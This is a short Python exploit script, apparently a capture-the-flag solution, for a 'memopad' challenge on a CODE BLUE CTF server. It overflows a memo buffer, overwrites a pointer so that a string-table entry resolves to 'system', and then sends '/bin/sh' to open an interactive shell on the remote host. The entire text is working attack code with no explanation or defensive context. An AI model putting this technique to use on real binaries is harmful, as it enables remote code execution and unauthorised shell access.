from skel import *

me['r']['tube'] = lambda: remote(host='memopad.tasks.ctf.codeblue.jp', port=5498)

s = tube()

s.sla('> ', '1')

payload = "A"*83 + "system\x00"
s.sla('Content: ', payload)

s.sla('> ', '1')
s.sla('Content: ', "A"*0x7f)

s.sla('> ', '2')
s.sla('Index: ', '3')

# strtab
target = 0x0601858

s.sla('Content:', 'A'*0x80 + p64(target-0x98))

s.sla('> ', '3')
s.sla('Index: ', '3')

s.sla('> ', '5')
s.sla('(y/n): ', '/bin/sh')

s.interactive()
